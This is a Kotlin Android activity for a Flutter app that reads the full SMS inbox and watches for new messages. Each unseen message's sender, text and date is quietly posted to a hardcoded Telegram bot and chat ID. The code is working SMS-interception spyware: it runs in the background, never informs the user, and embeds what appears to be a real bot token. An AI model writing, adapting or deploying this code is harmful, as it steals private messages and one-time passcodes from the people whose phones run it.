package com.example.smsapp

import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.util.Log
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : FlutterActivity() {
    private val CHANNEL = "sms.channel"
    private lateinit var smsChannel: MethodChannel

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        smsChannel = MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
        smsChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "getSms" -> {
                    val smsList = getAllSms()
                    result.success(smsList)
                }

                else -> result.notImplemented()
            }
        }
        startSmsObserver()
    }

    private fun getAllSms(): List<Map<String, String>> {
        val smsList = mutableListOf<Map<String, String>>()
        val uri: Uri = Uri.parse("content://sms/inbox")
        val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)

        cursor?.use {
            val previousSmsIds = getSmsIdsFromPreferences().toMutableSet() // Make it mutable

            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndexOrThrow("address")) ?: "No Address"
                val body = it.getString(it.getColumnIndexOrThrow("body")) ?: "No Body"
                val dateMillis = it.getLong(it.getColumnIndexOrThrow("date"))
                val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(
                    Date(dateMillis)
                )
                val smsId = it.getString(it.getColumnIndexOrThrow("_id")) ?: ""

                // Check if this SMS is already processed
                if (smsId !in previousSmsIds) {
                    // Add new SMS to the list and mark it as processed
                    smsList.add(
                        mapOf(
                            "address" to address,
                            "body" to body,
                            "date" to date
                        )
                    )
                    previousSmsIds.add(smsId)  // Mark the SMS as processed

                    // Log the new SMS details
                    Log.d("New SMS", "Address: $address, Body: $body, Date: $date")

                    // Send the new SMS details to Telegram
                    sendSmsToTelegram(address, body, date)

                    // Save the updated SMS IDs
                    saveSmsIdsToPreferences(previousSmsIds)
                }
            }
        }
        return smsList
    }


    private fun sendSmsToTelegram(address: String, body: String, date: String) {
        val botToken =
            "7223835990:AAHF6uuOmQeSG2UMeY28_kAtnNCktr3sNvc" // Replace with your bot token
        val chatId = "7321341340"     // Replace with the target chat ID
        val message = """
        📱 Devit new sms
        ✉️ From: $address.
        📝 Message: $body.
        📅 Date: $date.
    """.trimIndent()
        val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
        val params = "chat_id=$chatId&text=$message"

        // Coroutine to send HTTP request in the background
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                connection.outputStream.write(params.toByteArray(Charsets.UTF_8))
                connection.responseCode // To execute the request
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun startSmsObserver() {
        val smsUri: Uri = Uri.parse("content://sms")
        contentResolver.registerContentObserver(
            smsUri,
            true,
            object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean) {
                    super.onChange(selfChange)

                    // Get new SMS list
                    val newSmsList = getAllSms()

                    // Send new SMS list to Flutter
                    smsChannel.invokeMethod("onNewSms", newSmsList)
                }
            })
    }

    // Save SMS IDs to SharedPreferences
    private fun saveSmsIdsToPreferences(ids: Set<String>) {
        val sharedPrefs = getSharedPreferences("smsPrefs", MODE_PRIVATE)
        val editor = sharedPrefs.edit()
        editor.putStringSet("smsIds", ids)
        editor.apply()
    }

    // Retrieve SMS IDs from SharedPreferences
    private fun getSmsIdsFromPreferences(): Set<String> {
        val sharedPrefs = getSharedPreferences("smsPrefs", MODE_PRIVATE)
        return sharedPrefs.getStringSet("smsIds", mutableSetOf()) ?: mutableSetOf()
    }
}
